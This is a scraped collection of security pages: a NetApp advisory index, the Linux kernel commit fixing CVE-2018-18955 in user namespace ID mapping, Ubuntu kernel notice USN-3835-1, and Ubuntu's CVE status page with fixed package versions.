| [**NTAP-20151030-0001**](https://security.netapp.com/advisory/ntap-20151030-0001/) | October 2015 MySQL Vulnerabilities in Multiple NetApp Products | 2016-08-11 |
| [**NTAP-20151029-0001**](https://security.netapp.com/advisory/ntap-20151029-0001/) | CVE-2015-7599 VxWorks Vulnerability impacting NetApp E-Series products | 2016-01-19 |
| [**NTAP-20151028-0001**](https://security.netapp.com/advisory/ntap-20151028-0001/) | October 2015 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2017-03-22 |
| [**NTAP-20151026-0001**](https://security.netapp.com/advisory/ntap-20151026-0001/) | CVE-2015-7887 Authentication Bypass Vulnerability in SnapCenter Server 1.0 | 2016-01-07 |
| [**NTAP-20150716-0001**](https://security.netapp.com/advisory/ntap-20150716-0001/) | July 2015 MySQL Vulnerabilities in Multiple NetApp Products | 2015-12-03 |
| [**NTAP-20150715-0001**](https://security.netapp.com/advisory/ntap-20150715-0001/) | July 2015 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2017-03-22 |
| [**NTAP-20150709-0001**](https://security.netapp.com/advisory/ntap-20150709-0001/) | CVE-2015-1793 OpenSSL Vulnerability does not impact NetApp Products | 2015-07-09 |
| [**NTAP-20150619-0001**](https://security.netapp.com/advisory/ntap-20150619-0001/) | CVE-2015-4000 Diffie-Hellman Export Cipher Suite vulnerability in Multiple NetApp Products | 2022-02-21 |
| [**NTAP-20150616-0001**](https://security.netapp.com/advisory/ntap-20150616-0001/) | June 2015 OpenSSL Vulnerabilities in NetApp Products | 2019-07-24 |
| [**NTAP-20150528-0001**](https://security.netapp.com/advisory/ntap-20150528-0001/) | CVE-2015-3292 OnCommand Workflow Automation Remote Code Execution Vulnerability | 2015-05-28 |
| [**NTAP-20150417-0001**](https://security.netapp.com/advisory/ntap-20150417-0001/) | April 2015 Java Platform Standard Edition Vulnerabilities in Multiple NetApp Products | 2017-03-22 |
| [**NTAP-20150417-0002**](https://security.netapp.com/advisory/ntap-20150417-0002/) | April 2015 MySQL Vulnerabilities in Multiple NetApp Products | 2018-07-31 |
| [**NTAP-20150417-0003**](https://security.netapp.com/advisory/ntap-20150417-0003/) | CVE-2015-2575 MySQL Connector/J Vulnerability in Multiple NetApp Products | 2016-08-31 |
| [**NTAP-20150324-0001**](https://security.netapp.com/advisory/ntap-20150324-0001/) | Improper Handling of Export Policy Rules for SMBv2 and SMBv3 Clients Vulnerability in Clustered Data ONTAP 8.3 Release Candidates | 2017-02-07 |
| [**NTAP-20150323-0001**](https://security.netapp.com/advisory/ntap-20150323-0001/) | 7-Mode Transition Tool File Authorization Bypass Vulnerability | 2015-03-23 |
| [**NTAP-20150323-0002**](https://security.netapp.com/advisory/ntap-20150323-0002/) | March 2015 OpenSSL Vulnerabilities in Multiple NetApp Products | 2018-08-23 |
| [**NTAP-20150313-0001**](https://security.netapp.com/advisory/ntap-20150313-0001/) | Potential SMB services disruption after installation of Microsoft patch KB3002657-v1 on Windows 2003 Domain Controllers | 2015-03-31 |
| [**NTAP-20150304-0001**](https://security.netapp.com/advisory/ntap-20150304-0001/) | January 2015 MySQL Vulnerabilities in Multiple NetApp Products | 2018-07-31 |
| [**NTAP-20150209-0001**](https://security.netapp.com/advisory/ntap-20150209-0001/) | CVE-2003-1418 Apache ETag Inode Disclosure Vulnerability in Clustered Data ONTAP | 2015-02-09 |
| [**NTAP-20150205-0001**](https://security.netapp.com/advisory/ntap-20150205-0001/) | January 2015 OpenSSL Vulnerabilities in Multiple NetApp Products | 2016-08-31 |
| [**NTAP-20150127-0001**](https://security.netapp.com/advisory/ntap-20150127-0001/) | CVE-2015-0235 GNU C Library (glibc) Vulnerability in Multiple NetApp Products | 2018-03-20 |
| [**NTAP-20150126-0001**](https://security.netapp.com/advisory/ntap-20150126-0001/) | January 2015 Java Runtime Environment (JRE) Vulnerabilities in Multiple NetApp Products | 2017-03-22 |
| [**NTAP-20150122-0002**](https://security.netapp.com/advisory/ntap-20150122-0002/) | CVE-2003-0028 XDR Libraries Integer Overflow Vulnerability in Data ONTAP | 2017-08-24 |
| [**NTAP-20150122-0003**](https://security.netapp.com/advisory/ntap-20150122-0003/) | CVE-2014-4877 GNU Wget Vulnerability in Multiple NetApp Products | 2015-03-24 |
| [**NTAP-20150122-0001**](https://security.netapp.com/advisory/ntap-20150122-0001/) | RC4 Cipher Vulnerabilities in Multiple NetApp Products | 2022-02-02 |
| [**NTAP-20150115-0001**](https://security.netapp.com/advisory/ntap-20150115-0001/) | CVE-2014-9353 Default Privileged Account Credentials Vulnerability in OnCommand Balance | 2015-01-15 |
| [**NTAP-20150115-0002**](https://security.netapp.com/advisory/ntap-20150115-0002/) | CVE-2014-9354 Cleartext Storage of Sensitive Information in OnCommand Balance | 2015-01-23 |
| [**NTAP-20141222-0001**](https://security.netapp.com/advisory/ntap-20141222-0001/) | Network Time Protocol Daemon (ntpd) 4.2.7 Vulnerabilities in NetApp Products | 2015-01-05 |
| [**NTAP-20141125-0001**](https://security.netapp.com/advisory/ntap-20141125-0001/) | July 2014 Oracle MySQL vulnerabilities in Multiple NetApp Products | 2016-08-23 |
| [**NTAP-20141119-0001**](https://security.netapp.com/advisory/ntap-20141119-0001/) | October 2014 Oracle MySQL vulnerabilities in Multiple NetApp Products | 2018-07-31 |
| [**NTAP-20141030-0001**](https://security.netapp.com/advisory/ntap-20141030-0001/) | August 2014 OpenSSL CVE Bundle Security Vulnerabilities in Multiple NetApp Products | 2016-11-30 |
| [**NTAP-20141030-0002**](https://security.netapp.com/advisory/ntap-20141030-0002/) | CVE-2010-3613 BIND Vulnerability in Clustered Data ONTAP | 2014-12-02 |
| [**NTAP-20141030-0003**](https://security.netapp.com/advisory/ntap-20141030-0003/) | CVE-2012-1667 BIND Vulnerability in Clustered Data ONTAP | 2014-12-23 |
| [**NTAP-20141028-0002**](https://security.netapp.com/advisory/ntap-20141028-0002/) | GNUTLS Buffer Overflow vulnerabilities in Select NetApp Products | 2018-01-22 |
| [**NTAP-20141028-0001**](https://security.netapp.com/advisory/ntap-20141028-0001/) | July 2014 Java Runtime Environment (JRE) vulnerabilities in Multiple NetApp Products | 2017-03-22 |
| [**NTAP-20141024-0001**](https://security.netapp.com/advisory/ntap-20141024-0001/) | GNUTLS Certification Validation Bypass vulnerability in Select NetApp Products | 2018-01-22 |
| [**NTAP-20141023-0001**](https://security.netapp.com/advisory/ntap-20141023-0001/) | October 2014 Java Runtime Environment (JRE) Vulnerabilities in Multiple NetApp Products | 2017-03-22 |
| [**NTAP-20141015-0001**](https://security.netapp.com/advisory/ntap-20141015-0001/) | CVE-2014-3566 SSL v3.0 Nondeterministic CBC Padding Vulnerability in Multiple NetApp Products | 2019-10-21 |
| [**NTAP-20141015-0002**](https://security.netapp.com/advisory/ntap-20141015-0002/) | October 2014 OpenSSL Vulnerabilities in Multiple NetApp Products | 2016-12-13 |
| [**NTAP-20140924-0001**](https://security.netapp.com/advisory/ntap-20140924-0001/) | Bash Code Injection Vulnerability in Select NetApp Products | 2015-03-11 |
| [**NTAP-20140911-0001**](https://security.netapp.com/advisory/ntap-20140911-0001/) | CVE-2014-0114 Apache Commons BeanUtils Vulnerability in Multiple NetApp Products | 2021-07-05 |
| [**NTAP-20140609-0002**](https://security.netapp.com/advisory/ntap-20140609-0002/) | June 2014 OpenSSL DTLS Vulnerabilities in Multiple NetApp Products | 2015-03-27 |
| [**NTAP-20140609-0004**](https://security.netapp.com/advisory/ntap-20140609-0004/) | June 2014 OpenSSL Elliptic Curve Vulnerabilities in Multiple NetApp Products | 2016-08-23 |
| [**NTAP-20140609-0001**](https://security.netapp.com/advisory/ntap-20140609-0001/) | June 2014 OpenSSL TLS Handshake Vulnerability in Select NetApp Products | 2016-08-23 |
| [**NTAP-20140609-0003**](https://security.netapp.com/advisory/ntap-20140609-0003/) | OpenSSL SSL\_MODE\_RELEASE\_BUFFERS Vulnerabilities in NetApp Products | 2014-12-23 |
| [**NTAP-20140410-0001**](https://security.netapp.com/advisory/ntap-20140410-0001/) | OpenSSL Heartbeat Extension Vulnerability in Multiple NetApp Products | 2018-07-17 |

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from git.kernel.org_f887eca8_20250126_033830.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jann Horn <jannh@google.com> | 2018-11-05 20:55:09 +0100 |
| --- | --- | --- |
| committer | Eric W. Biederman <ebiederm@xmission.com> | 2018-11-07 23:51:16 -0600 |
| commit | [d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)) | |
| tree | [9720c07318f1c5591dd3fb67a9bfdc80efc1f2da](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) | |
| parent | [651022382c7f8da46cb4872a545ee1da6d097d2a](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=651022382c7f8da46cb4872a545ee1da6d097d2a) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd&id2=651022382c7f8da46cb4872a545ee1da6d097d2a)) | |
| download | [linux-d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd.tar.gz) | |

userns: also map extents in the reverse map to kernel IDsThe current logic first clones the extent array and sorts both copies, then
maps the lower IDs of the forward mapping into the lower namespace, but
doesn't map the lower IDs of the reverse mapping.
This means that code in a nested user namespace with >5 extents will see
incorrect IDs. It also breaks some access checks, like
inode\_owner\_or\_capable() and privileged\_wrt\_inode\_uidgid(), so a process
can incorrectly appear to be capable relative to an inode.
To fix it, we have to make sure that the "lower\_first" members of extents
in both arrays are translated; and we have to make sure that the reverse
map is sorted \*after\* the translation (since otherwise the translation can
break the sorting).
This is CVE-2018-18955.
Fixes: 6397fac4915a ("userns: bump idmap limits to 340")
Cc: stable@vger.kernel.org
Signed-off-by: Jann Horn <jannh@google.com>
Tested-by: Eric W. Biederman <ebiederm@xmission.com>
Reviewed-by: Eric W. Biederman <ebiederm@xmission.com>
Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)

| -rw-r--r-- | [kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/kernel/user_namespace.c?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) | 12 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 8 insertions, 4 deletions

| diff --git a/kernel/user\_namespace.c b/kernel/user\_namespace.cindex e5222b5fb4fe6c..923414a246e9e4 100644--- a/[kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/user_namespace.c?id=651022382c7f8da46cb4872a545ee1da6d097d2a)+++ b/[kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/user_namespace.c?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)@@ -974,10 +974,6 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, if (!new\_idmap\_permitted(file, ns, cap\_setid, &new\_map)) goto out; - ret = sort\_idmaps(&new\_map);- if (ret < 0)- goto out;- ret = -EPERM; /\* Map the lower ids from the parent user namespace to the \* kernel global id space.@@ -1004,6 +1000,14 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, e->lower\_first = lower\_first; } + /\*+ \* If we want to use binary search for lookup, this clones the extent+ \* array and sorts both copies.+ \*/+ ret = sort\_idmaps(&new\_map);+ if (ret < 0)+ goto out;+ /\* Install the map \*/ if (new\_map.nr\_extents <= UID\_GID\_MAP\_MAX\_BASE\_EXTENTS) { memcpy(map->extent, new\_map.extent, |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-26 03:37:07 +0000



=== Content from usn.ubuntu.com_74c5454d_20250124_213124.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3835-1: Linux kernel vulnerabilities

3 December 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-gcp](/security/cves?package=linux-gcp) - Linux kernel for Google Cloud Platform (GCP) systems
* [linux-kvm](/security/cves?package=linux-kvm) - Linux kernel for cloud environments
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2

## Details

Jann Horn discovered that the procfs file system implementation in the

Linux kernel did not properly restrict the ability to inspect the kernel

stack of an arbitrary task. A local attacker could use this to expose

sensitive information. ([CVE-2018-17972](/security/CVE-2018-17972))

Jann Horn discovered that the mremap() system call in the Linux kernel did

not properly flush the TLB when completing, potentially leaving access to a

physical page after it has been released to the page allocator. A local

attacker could use this to cause a denial of service (system crash), expose

sensitive information, or possibly execute arbitrary code. ([CVE-2018-18281](/security/CVE-2018-18281))

It was discovered that the BPF verifier in the Linux kernel did not

correctly compute numeric bounds in some situations. A local attacker could

use this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2018-18445](/security/CVE-2018-18445))

Daniel Dadap discovered that the module loading implementation in the Linux

kernel did not properly enforce signed module loading when booted with UEFI

Secure Boot in some situations. A local privileged attacker could use this

to execute untrusted code in the kernel. ([CVE-2018-18653](/security/CVE-2018-18653))

Jann Horn discovered that the Linux kernel mishandles mapping UID or GID

ranges inside nested user namespaces in some situations. A local attacker

could use this to bypass access controls on resources outside the

namespace. ([CVE-2018-18955](/security/CVE-2018-18955))

Philipp Wendler discovered that the overlayfs implementation in the Linux

kernel did not properly verify the directory contents permissions from

within a unprivileged user namespace. A local attacker could use this to

expose sensitive information (protected file names). ([CVE-2018-6559](/security/CVE-2018-6559))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.10

* linux-image-gke
  -
  4.18.0.1004.4
* linux-image-generic
  -
  4.18.0.12.13
* [linux-image-4.18.0-12-generic](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-12.13](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-12.13)
* [linux-image-4.18.0-12-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-12.13](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-12.13)
* [linux-image-4.18.0-1007-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.18.0-1007.9](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.18.0-1007.9)
* linux-image-gcp
  -
  4.18.0.1004.4
* [linux-image-4.18.0-12-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-12.13](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-12.13)
* [linux-image-4.18.0-1004-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-gcp)
  -
  [4.18.0-1004.5](https://launchpad.net/ubuntu/%2Bsource/linux-gcp/4.18.0-1004.5)
* [linux-image-4.18.0-12-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-12.13](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-12.13)
* linux-image-generic-lpae
  -
  4.18.0.12.13
* [linux-image-4.18.0-1005-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [4.18.0-1005.5](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/4.18.0-1005.5)
* linux-image-snapdragon
  -
  4.18.0.12.13
* linux-image-kvm
  -
  4.18.0.1005.5
* linux-image-lowlatency
  -
  4.18.0.12.13
* linux-image-raspi2
  -
  4.18.0.1007.4

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-17972](/security/CVE-2018-17972)
* [CVE-2018-18281](/security/CVE-2018-18281)
* [CVE-2018-18445](/security/CVE-2018-18445)
* [CVE-2018-18653](/security/CVE-2018-18653)
* [CVE-2018-18955](/security/CVE-2018-18955)
* [CVE-2018-6559](/security/CVE-2018-6559)

## Related notices

* [USN-3821-1](/security/notices/USN-3821-1)
* [USN-3880-2](/security/notices/USN-3880-2)
* [USN-3871-4](/security/notices/USN-3871-4)
* [USN-3871-1](/security/notices/USN-3871-1)
* [USN-3871-5](/security/notices/USN-3871-5)
* [USN-3832-1](/security/notices/USN-3832-1)
* [USN-3880-1](/security/notices/USN-3880-1)
* [USN-3871-3](/security/notices/USN-3871-3)
* [USN-3821-2](/security/notices/USN-3821-2)
* [USN-3847-2](/security/notices/USN-3847-2)
* [USN-3847-3](/security/notices/USN-3847-3)
* [USN-3847-1](/security/notices/USN-3847-1)
* [USN-3833-1](/security/notices/USN-3833-1)
* [USN-3836-1](/security/notices/USN-3836-1)
* [USN-3836-2](/security/notices/USN-3836-2)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from security.netapp.com_3cf4a1eb_20250126_033841.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)

## NetApp Product Security

NetApp is an industry leader in developing and implementing product security standards. Learn how our security polices, certifications, and guidelines can help you maintain the confidentiality, integrity, and availability of your data.

![Advisories](/images/icons-product-security-146x146.png)
### [Advisories](https://security.netapp.com/advisory/)

Review vulnerability announcements and remediation instructions published by the Product Security Incident Response Team.

![Bulletins](/images/icon-find-training-146x146.png)
### [Bulletins](https://security.netapp.com/bulletins/)

Review information regarding non-NetApp vulnerabilities and their potential impact on NetApp Products.

![Contact](/images/icon-contact-146x146.png)
### [Contact](https://security.netapp.com/contact/)

Learn the best ways to reach out to NetApp in various security scenarios.

![Policy](/images/icon-policy-146x146.png)
### [Policy](https://security.netapp.com/policy/)

Find out about NetApp's approach to product security processes and policy.

![Resources](/images/icon-global-learning-partners-146x146.png)
### [Resources](https://security.netapp.com/resources/)

Explore guidance, recommendations, and best practices for securely operating NetApp systems.

![Certifications](/images/icon-get-certified-146x146.png)
### [Certifications](https://security.netapp.com/certs/)

Visit the [Trust Center](https://www.netapp.com/company/trust-center/compliance/) for details about NetAppâs industry-leading compliance achievements

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from people.canonical.com_5f1e006e_20250126_033827.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2018-18955

Publication date 16 November 2018

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/8010f9e0-CVE-Priority-icon-Medium.svg)

**Medium**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg)

**7.0 · High**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Severity score breakdown](#impact-score)
* [References](#references)

In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map\_write() in
kernel/user\_namespace.c allows privilege escalation because it mishandles
nested user namespaces with more than 5 UID or GID ranges. A user who has
CAP\_SYS\_ADMIN in an affected user namespace can bypass access controls on
resources outside the namespace, as demonstrated by reading /etc/shadow.
This occurs because an ID transformation takes place properly for the
namespaced-to-kernel direction but not for the kernel-to-namespaced
direction.

## From the Ubuntu Security Team

Jann Horn discovered that the Linux kernel mishandles mapping UID or GID
ranges inside nested user namespaces in some situations. A local attacker
could use this to bypass access controls on resources outside the
namespace.

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| linux | 18.10 cosmic | Fixed 4.18.0-12.13 |
| 18.04 LTS bionic | Fixed 4.15.0-42.45 |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not affected |
| linux-aws | 18.10 cosmic | Fixed 4.18.0-1006.7 |
| 18.04 LTS bionic | Fixed 4.15.0-1029.30 |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not affected |
| linux-aws-hwe | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |
| linux-azure | 18.10 cosmic | Fixed 4.18.0-1006.6 |
| 18.04 LTS bionic | Fixed 4.15.0-1035.36 |
| 16.04 LTS xenial | Fixed 4.15.0-1035.36~16.04.1 |
| 14.04 LTS trusty | Fixed 4.15.0-1035.36~14.04.2 |
| linux-azure-edge | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Fixed 4.15.0-1035.36 |
